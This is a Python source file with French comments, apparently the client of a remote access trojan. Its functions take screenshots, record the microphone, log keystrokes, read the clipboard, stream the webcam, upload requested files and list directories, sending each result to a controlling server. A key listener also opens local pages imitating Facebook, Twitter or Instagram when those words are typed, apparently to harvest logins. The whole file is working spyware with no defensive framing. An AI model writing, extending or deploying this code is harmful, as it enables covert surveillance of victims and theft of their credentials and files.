import base64
import io
import os
import threading
import time
import wave
import webbrowser

import cv2
import keyboard
import pyaudio
import pyautogui
import pyperclip
from PIL import Image
from pynput.keyboard import Key, Listener

current_keys = []
trigger_words = {
    'facebook': 'https://127.0.0.1:5000/facebook',
    'twitter': 'https://127.0.0.1:5000/twitter',
    'instagram': 'https://127.0.0.1:5000/instagram'
}
page_opened_recently = False

stop_streaming_events = {}  # Dictionnaire pour gérer les événements d'arrêt pour chaque utilisateur


def take_and_send_screenshot(callback, user_id):
    try:
        screenshot = pyautogui.screenshot()
        screenshot_bytes_io = io.BytesIO()
        screenshot.save(screenshot_bytes_io, format='PNG')
        screenshot_bytes_io.seek(0)
        resized_screenshot = resize_image(screenshot_bytes_io)
        screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()
        callback({'screenshot': screenshot_encoded, 'user_id': user_id})
        print("Capture d'écran envoyée")
    except Exception as e:
        print(f"Échec de la capture d'écran: {e}")
        pass


def resize_image(image_bytes_io, base_width=1300):
    img = Image.open(image_bytes_io)
    w_percent = (base_width / float(img.size[0]))
    h_size = int((float(img.size[1]) * float(w_percent)))
    img = img.resize((base_width, h_size), Image.Resampling.LANCZOS)
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    return img_byte_arr


def record_and_send_audio(callback, duration=10, user_id=None):
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        for i in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()

        audio_bytes = b''.join(frames)
        audio_io = io.BytesIO()
        save_wave_file(audio_io, audio_bytes)

        audio_io.seek(0)
        audio_encoded = base64.b64encode(audio_io.read()).decode()
        callback({'audio': audio_encoded, 'user_id': user_id})
        print("Audio envoyé")
    except Exception as e:
        print(f"Échec de l'enregistrement audio: {e}")
        pass


def save_wave_file(file_io, audio_data):
    with wave.open(file_io, 'wb') as wave_file:
        wave_file.setnchannels(1)
        wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
        wave_file.setframerate(44100)
        wave_file.writeframes(audio_data)


def record_and_send_keyboard_log(callback, duration=10, user_id=None):
    try:
        print("Enregistrement du keylogger en cours...")
        keyboard.start_recording()
        time.sleep(duration)
        keyboard_events = keyboard.stop_recording()
        keyboard_log = [event.name for event in keyboard_events if event.event_type == 'down']
        keyboard_log = [f"{key} - {time.strftime('%d/%m/%Y %H:%M:%S')}" for key in keyboard_log]
        callback({'keyboard_log': keyboard_log, 'user_id': user_id})
        print("Keylogger envoyé")
    except Exception as e:
        print(f"Échec de l'enregistrement du keylogger: {e}")
        pass


def get_clipboard_content(callback, user_id=None):
    try:
        print("Récupération du clipboard...")
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            callback({'clipboard_content': clipboard_content, 'user_id': user_id})
            print("Contenu du clipboard envoyé au serveur.")
        else:
            print("Aucun contenu trouvé dans le clipboard.")
    except Exception as e:
        print(f"Échec de la récupération du clipboard: {e}")


def gen_frames(sio, user_id):
    try:
        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Utilisez DirectShow au lieu de MSMF
        if not camera.isOpened():
            raise ValueError("Failed to open webcam")

        while not stop_streaming_events[user_id].is_set():
            success, frame = camera.read()
            if not success:
                print("Failed to read frame from webcam")
                break
            else:
                ret, buffer = cv2.imencode('.jpg', frame)
                if not ret:
                    print("Failed to encode frame")
                    continue
                frame_bytes = base64.b64encode(buffer)
                sio.emit('webcam_response', {'data': frame_bytes.decode(), 'user_id': user_id})
    except Exception as e:
        print(f"Exception occurred in gen_frames: {e}")
    finally:
        if 'camera' in locals() and camera.isOpened():
            camera.release()
        cv2.destroyAllWindows()


def start_stream(sio, user_id):
    global stop_streaming_events
    stop_streaming_events[user_id] = threading.Event()
    threading.Thread(target=gen_frames, args=(sio, user_id)).start()


def stop_stream(user_id):
    global stop_streaming_events
    if user_id in stop_streaming_events:
        stop_streaming_events[user_id].set()


def download_file(callback, file_path, user_id):
    try:
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                file_data = file.read()
                file_encoded = base64.b64encode(file_data).decode()
                callback({'file': file_encoded, 'file_name': os.path.basename(file_path), 'user_id': user_id})
                print("Fichier envoyé")
        else:
            print("Fichier introuvable")
    except Exception as e:
        print(f"Échec de l'envoi du fichier: {e}")


def list_dir(callback, dir_path):
    files_and_dirs = []
    try:
        if os.path.exists(dir_path) and os.path.isdir(dir_path):
            for file_name in os.listdir(dir_path):
                file_path = os.path.join(dir_path, file_name)
                if os.path.isfile(file_path):
                    size = os.path.getsize(file_path)
                    if size < 1024:
                        size = f"{size} B"
                    elif size < 1024 ** 2:
                        size = f"{size / 1024:.2f} KB"
                    elif size < 1024 ** 3:
                        size = f"{size / 1024 ** 2:.2f} MB"
                    else:
                        size = f"{size / 1024 ** 3:.2f} GB"

                    files_and_dirs.append({'name': file_name, 'type': 'file'})
                elif os.path.isdir(file_path):
                    files_and_dirs.append({'name': file_name, 'type': 'dir'})
            files_and_dirs.append({'path': dir_path})
            callback({'directory_listing': files_and_dirs})
            print(f"Liste des fichiers et dossiers de {dir_path} envoyée")
        else:
            print("Chemin du répertoire invalide ou inexistant")
    except Exception as e:
        print(f"Échec de la liste des fichiers et dossiers: {e}")


def on_press(key):
    global page_opened_recently
    try:
        if key.char:
            current_keys.append(key.char)
    except AttributeError:
        pass

    typed_string = ''.join(filter(None, current_keys)).lower()

    if not page_opened_recently:  # Check if the flag is False
        for word, url in trigger_words.items():
            if word in typed_string:
                webbrowser.open(url)
                current_keys.clear()
                page_opened_recently = True  # Set the flag to True
                break


def on_release(key):
    global page_opened_recently
    if key == Key.esc:
        return False  # Stop listening if the escape key is pressed
    page_opened_recently = False  # Reset the flag on key release


def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
